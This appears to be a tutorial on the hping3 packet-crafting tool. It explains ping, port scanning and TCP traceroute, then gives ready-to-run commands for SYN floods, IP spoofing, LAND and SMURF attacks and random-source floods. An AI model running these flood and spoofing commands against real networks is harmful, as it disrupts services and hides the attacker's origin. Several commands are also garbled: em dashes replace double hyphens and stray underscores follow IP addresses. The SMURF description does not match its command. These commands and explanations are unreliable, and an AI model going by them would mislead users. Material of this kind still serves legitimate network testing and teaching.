`hping3` is a **command-line network security tool** used for **scanning, testing, and troubleshooting** networks. It allows users to **craft and send custom TCP, UDP, ICMP, and raw IP packets**, making it useful for **firewall testing, port scanning, intrusion detection system (IDS) testing, and denial-of-service (DoS) attack simulations**.

It is similar to the standard `ping` command but **far more powerful**, as it enables advanced packet manipulation and supports various protocols beyond just ICMP.


**Port Scanning** – Checks which ports are open on a target system.   
**Firewall Testing** – Detects firewall rules and security configurations.  
**IP Spoofing** – Sends packets with a fake source IP address.  
**DoS Attack Simulation** – Generates high-traffic floods to test system resilience.   
**Traceroute Functionality** – Maps the network path of packets using TCP instead of ICMP.  
**Packet Crafting** – Allows full customization of network packets (flags, payloads, timing, etc.).


`hping` sends **custom network packets** to a target and analyzes the response. Based on the type of response (or lack thereof), it can infer information about:

- **Open/closed ports**
- **Firewall rules**
- **Network latency**
- **System uptime**
- **Routing paths**

Unlike `ping`, which only sends ICMP Echo Requests, `hping` can send packets using **TCP, UDP, ICMP, or raw IP**, making it useful for both **legitimate security testing and malicious attacks** (ethical hacking, penetration testing).

---

 **1. Check if a host is online (like ping but with more control)**

```bash
hping3 -1 192.168.1.1
```

- `-1`: Sends **ICMP Echo Requests** (like `ping`).

 
**2. Perform a TCP SYN Scan (detect open ports)**

```bash
hping3 --scan 1-65535 192.168.1.1 -S --rand-source
```

- `-S`: Sends **SYN packets** to test check for open ports from random source IP addresses.
  
 **3. Spoof Source IP Address (IP Spoofing)**

```bash
hping3 -S -p 443 -a 10.10.10.10 192.168.1.1
```

- `-a 10.10.10.10`: Fake source IP **(spoofing attack simulation)**.

 **4. Simulate a Denial-of-Service (DoS) attack**

```bash
hping3 -S --flood -p 80 192.168.1.1
```

- `--flood`: Sends packets **as fast as possible** (network stress testing).

 **5. Perform a TCP Traceroute**

```bash
hping3 --traceroute -S -p 80 192.168.1.1
```

- `--traceroute`: Maps **network path** using **TCP instead of ICMP**.

**6. LAND Attack**

```bash
hping3 -S -p 80 127.0.0.1 -a 127.0.0.1_
```

- This is a kind of DoS (Denial of Service) attack in which a packet is sent to a target machine with the same address.

**7. SMURF Attack:**

```bash
 hping3 — icmp — flood 127.0.0.1 -a 127.0.0.1_
```

- This is a kind of DDoS attack in which spoofed source address send a large amount of ICMP packets to the target address. It uses a victim address as a source address to send/broadcast the multiple ICMP ping request.


**Random Source Attack**

```bash
hping3 -S -p 80 Target — flood — rand-source
```

 - An attacker can send multiple random packets with different source addresses to the target machine which may cause the Distributed denial of service attack. It is difficult to identify the actual source address after an incident occurs.
